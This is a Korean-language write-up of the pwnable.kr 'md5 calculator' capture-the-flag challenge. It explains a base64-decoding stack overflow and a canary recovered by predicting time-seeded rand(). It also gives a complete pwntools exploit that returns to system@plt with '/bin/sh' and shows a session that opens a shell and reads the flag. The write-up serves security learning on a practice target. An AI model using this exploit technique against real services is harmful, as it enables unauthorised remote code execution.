# [pwnable.kr] md5 calculator writeup



```shell
We made a simple MD5 calculator as a network service.
Find a bug and exploit it to get a shell.

Download : http://pwnable.kr/bin/hash
hint : this service shares the same machine with pwnable.kr web service

Running at : nc pwnable.kr 9002
```

ㄱㄱ

```shell
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

canary 정도가 걸려있다.

#### my_hash()

```c
unsigned int my_hash()
{
  signed int i; // [esp+0h] [ebp-38h]
  int v2[8]; // [esp+Ch] [ebp-2Ch]
  unsigned int canary; // [esp+2Ch] [ebp-Ch]

  canary = __readgsdword(0x14u);
  for ( i = 0; i <= 7; ++i )
    v2[i] = rand();
  return v2[4] - v2[6] + v2[7] + canary + v2[2] - v2[3] + v2[1] + v2[5];
}
```

저 리턴 값을 사용자에게 출력해주는데, 일단 여기서 seed를 알 수 있는 경우 canary를 역연산해서 알아낼 수 있다는 걸 주의하고 가자.

#### process_hash()

```c
unsigned int process_hash()
{
  int length; // ST14_4
  char *ptr; // ST18_4
  char buffer; // [esp+1Ch] [ebp-20Ch]
  unsigned int v4; // [esp+21Ch] [ebp-Ch]

  v4 = __readgsdword(0x14u);
  memset(&buffer, 0, 0x200u);
  while ( getchar() != 10 )
    ;
  memset(g_buf, 0, sizeof(g_buf));
  fgets(g_buf, 0x400, stdin);
  memset(&buffer, 0, 0x200u);
  length = Base64Decode(g_buf, (int)&buffer);
  ptr = calc_md5((int)&buffer, length);
  printf("MD5(data) : %s\n", ptr);
  free(ptr);
  return __readgsdword(0x14u) ^ v4;
}
```

일단 취약점틱한(?) 어색한 부분을 발견할 수 있다. g_buf는 사용자가 입력한 base64 값을 저장하는 전역변수인데, 해당 주소의 값을 읽어 decode한 뒤 로컬 변수 buffer에 저장한다. 위의 코드를 살펴보면, 각각의 변수들을 초기 memset을 이용해 초기화해주는 과정에서 size의 차이가 발생함을 알 수 있다.

bof의 냄새가 솔솔 나는것 같다.

#### Base64Decode()

```c
int __cdecl Base64Decode(const char *g_buf, int stack_buf)
{
  signed int v2; // ST2C_4
  FILE *stream; // ST34_4
  int v4; // eax
  int v5; // ST38_4
  int v6; // eax
  int v7; // ST3C_4

  v2 = calcDecodeLength(g_buf);
  stream = (FILE *)fmemopen(g_buf, strlen(g_buf), "r");
  v4 = BIO_f_base64();
  v5 = BIO_new(v4);
  v6 = BIO_new_fp(stream, 0);
  v7 = BIO_push(v5, v6);
  BIO_set_flags(v7, 256);
  *(_BYTE *)(stack_buf + BIO_read(v7, stack_buf, strlen(g_buf))) = 0;
  BIO_free_all(v7);
  fclose(stream);
  return v2;
}
```

여기서 사용되는 함수들은 openssl의 함수들이라고 하는데, 자세하게 살펴보지는 않아서 잘은 모르겠다. 다만 BIO_read() 함수에서 g_buf에 있던 데이터들이 디코딩되어 아까봤던 로컬 변수에 저장될 거라고 예상된다. 실제 확인해보니 해당 함수에서 데이터가 복사되는 것이 맞다.

세 번째 인자에 들어가는 값만큼 데이터를 복사하는데, 기준이 최대 0x400만큼 저장할 수 있는 g_buf이기 때문에, stack buffer overflow가 발생할 수 있게된다.

현재 시간을 seed 값으로 사용하므로 프로그램에서 던져주는 값을 역연산하면 canary 값도 있으니 손쉽게 쉘을 따는 것이 가능하다.

system 함수의 plt가 존재해서 libc leak할 필요도 없다.

#### exploit

```python
#/usr/bin/python
from pwn import *
import base64
from ctypes import *
from ctypes.util import find_library 

#libc = cdll.Loadlibrary(find_library('c'))
libc = CDLL(find_library('c'))
libc.srand(libc.time(0))
array = [ libc.rand() for i in range(8)]

context.log_level = 'debug'
r = process('./hash')
r = remote('pwnable.kr', 9002)

system_plt = 0x8048880
g_bufs = 0x804b0e0 + 0x2d0

r.recvuntil('captcha : ')
recv = int(r.recvline()[:-1])
r.sendline(str(recv))
canary = (recv - array[4] + array[6] - array[7] - array[2] + array[3] - array[1] - array[5]) & 0xffffffff;
success('canary = '+hex(canary))
r.recvuntil('Encode your data with BASE64 then paste me!\n')

payload = ''
payload += 'A'*(0x200)
payload += p32(canary)
payload += 'BBBB'*3
payload += p32(system_plt)
payload += 'BBBB'
payload += p32(g_bufs)

#gdb.attach(r, 'b* 0x8048da8')
r.sendline(base64.encodestring(payload).replace('\n', '')+'/bin/sh'+'\x00')

r.interactive()
```

난수 생성이길래 python의 random 류의 함수들을 사용하면 안될까 생각했었는데, 찾아보니 C와 Python에서 random으로 사용하는 방법이 달라서 같은 seed 값을 넣어도 다른 결과가 나온다는 것 같다.

ctypes를 이용해서 python에서 c 함수를 그대로 사용해서 구현할 수 있었다. cdll.Loadlibrary()는 왜 안되는지 잘 모르겠다..



```shell
[+] Starting local process './hash': pid 19089
[+] Opening connection to pwnable.kr on port 9002: Done
[+] canary = 0xa71a0400
[*] Switching to interactive mode
MD5(data) : 58936ab32428a001f40027fcb3c60bfb
$ id
uid=1036(md5calculator) gid=1036(md5calculator) groups=1036(md5calculator)
$ cat flag
Canary, Stack guard, Stack protector.. what is the correct expression?
```





